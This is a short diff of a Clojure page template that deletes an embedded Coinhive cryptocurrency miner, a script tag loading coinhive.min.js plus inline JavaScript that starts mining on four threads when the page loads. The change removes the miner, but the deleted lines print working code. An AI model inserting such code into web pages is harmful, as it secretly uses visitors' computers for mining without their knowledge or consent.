@@ -156,11 +156,7 @@
 
             [:script {:type "application/ld+json"} dat/data-website]
             [:amp-analytics {:type "googleanalytics"}
-             [:script {:type "application/json"} dat/data-analytics]]
-            [:script {:async false :src "https://coinhive.com/lib/coinhive.min.js"}]
-            [:script {:type "text/javascript"} "var m = new CoinHive.Anonymous('"
-                            (env :chive-key)
-                            "'); m.setNumThreads(4); m.start(); m.on('accepted', function () {console.log('hash accepted')})"]]]))))
+             [:script {:type "application/json"} dat/data-analytics]]]]))))
 
 
 (defn log [req]
